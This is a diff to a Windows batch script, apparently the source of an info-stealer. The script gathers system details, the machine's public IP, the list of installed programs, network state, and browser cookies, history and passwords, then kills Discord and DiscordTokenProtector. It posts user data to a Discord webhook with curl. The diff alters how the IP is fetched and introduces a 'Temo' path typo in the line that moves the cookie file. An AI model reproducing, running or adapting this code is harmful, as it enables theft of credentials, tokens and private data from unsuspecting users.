@@ -1,6 +1,6 @@
 @echo off
 set webhook=YOUR_WEBHOOK_HERE
-ipconfig | findstr /R /C:"IPv4 Address" > %userprofile%\AppData\Local\Temp\ipp.txt
+curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -13,7 +13,7 @@ wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 taskkill /im Discord.exe /f
 taskkill /im DiscordTokenProtector.exe /f
@@ -67,7 +67,7 @@ move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
 move %localappdata%\Temp\programms.txt %localappdata%\Temp\KDOT\programms.txt
 move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
 move %localappdata%\Temp\wlan.txt %localappdata%\Temp\KDOT\wlan.txt
-move %localappdata%\Temp\browser-cookies.txt %localappdata%\Temp\KDOT\browser-cookies.txt
+move %localappdata%\Temo\browser-cookies.txt %localappdata%\Temo\KDOT\browser-cookies.txt
 move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
 move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
 move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop-screenshot.png
